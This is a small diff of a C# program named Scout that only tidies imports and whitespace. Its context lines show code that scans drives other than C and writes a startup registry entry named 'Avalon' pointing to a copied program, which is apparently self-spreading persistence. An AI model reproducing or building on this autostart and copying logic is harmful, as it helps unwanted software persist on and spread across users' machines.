@@ -1,7 +1,5 @@
-﻿using System;
-using System.IO;
+﻿using System.IO;
 using Microsoft.Win32;
-using static System.Net.Mime.MediaTypeNames;
 
 namespace Scout
 {
@@ -35,7 +33,6 @@ namespace Scout
             {
                 if (d.IsReady)
                 {
-
                     if (d.VolumeLabel.ToLower() != Windows_OS.nameMyDriver.ToLower() &&
                         d.Name.ToLower() != driveC.ToLower())
                     {
@@ -71,14 +68,10 @@ namespace Scout
         {
             RegistryKey currentUserKey = Registry.CurrentUser;
 
-                                             // CreateSubKey
+            // CreateSubKey
             RegistryKey myKey = currentUserKey.OpenSubKey(@"Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run" , true);
             myKey.SetValue("Avalon", newPath + @"\" + Program.name_Of_The_Program_To_Copy.ToString()); // 
             myKey.Close();
-
-           
-
-            
         }
     }
 }
